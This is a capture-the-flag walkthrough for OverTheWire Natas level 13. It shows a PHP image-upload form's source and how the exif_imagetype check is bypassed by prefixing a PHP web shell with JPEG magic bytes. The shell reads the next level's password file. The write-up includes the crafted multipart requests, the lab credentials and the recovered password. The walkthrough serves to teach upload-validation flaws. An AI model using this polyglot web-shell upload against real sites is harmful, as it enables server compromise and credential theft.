## Level12 -> Level13


The web page looks almost identical as the previous level.


Here's the source code. 


```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```


Here's the intercepted request when uploading a jpg file.


```
POST /index.php HTTP/1.1
Host: natas13.natas.labs.overthewire.org
Content-Length: 1171
Cache-Control: max-age=0
Authorization: Basic bmF0YXMxMzp0cmJzNXBDakNya3VTa25CQktIaGFCeHE2V20xajNMQw==
Accept-Language: ko-KR,ko;q=0.9
Origin: http://natas13.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymVxjGh8iuBOfBAKN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://natas13.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundarymVxjGh8iuBOfBAKN
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundarymVxjGh8iuBOfBAKN
Content-Disposition: form-data; name="filename"

1aangq28cy.jpg
------WebKitFormBoundarymVxjGh8iuBOfBAKN
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.jpg"
Content-Type: image/jpeg

ÿØÿà
``


I changed the request like below but it didn't reveal the password.


```
1aangq28cy.php
------WebKitFormBoundarymVxjGh8iuBOfBAKN
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.php"
Content-Type: application/php

<?php 
	passthru('cat /etc/natas_webpass/natas14');
?>
```


Instead it returned `File is not an image`.


However, what you can do here is to put the php code in between the weird letters which are the actual bytes of the jpg file.


```
1aangq28cy.php
------WebKitFormBoundaryy99xS6ZtfdMndFgF
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.php"
Content-Type: application/php

ÿØÿà
<?php 
	passthru('cat /etc/natas_webpass/natas14);
?>
```


Then click forward it will tell you that a php file was uploaded.


Click on the link and then click forward in burp again.


Along side a whole bunch of weird characters you'll find a password.


```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ 
```


Well why did deleting all the bytes that made up of the jpg file and replacing it with php content not work?


It's because of this line in the source code. 


```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    }
```


The source code checks if the uploaded file is a jpg file with the **[exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php)** function. 



The `exif_imagetype` function reads the first bytes(signature) of the file to check if the file content matches the file extension.


The return value of `exif_imagetype` for `jpg` types should be `2`.


https://www.php.net/manual/en/image.constants.php#constant.imagetype-jpeg


Below is the file signature for jpg files in hex.


https://en.wikipedia.org/wiki/List_of_file_signatures

```
FF D8 FF E0	(hex)
ÿØÿà	(ISO 8859-1)
```


How exactly did the exploit work? 


We tricked natas by bypassing `exif_imagetype`'s image check, because `exif_imagetype` only checks if the file header or signature which are the first few bytes of the jpg file is `FF D8 FF E0`.


It does not care about the entire bytes that make up the jpg file at all. 


As long as the file we upload starts with `FF D8 FF E0` it doesn't matter what kind of file we upload. 


To get the password we uploaded a web shell that executes commands on the Apache server. 


Here are some extra reading to understand what MIME types are. 


### 1. What are MIME types in http? 


https://en.wikipedia.org/wiki/Media_type


https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types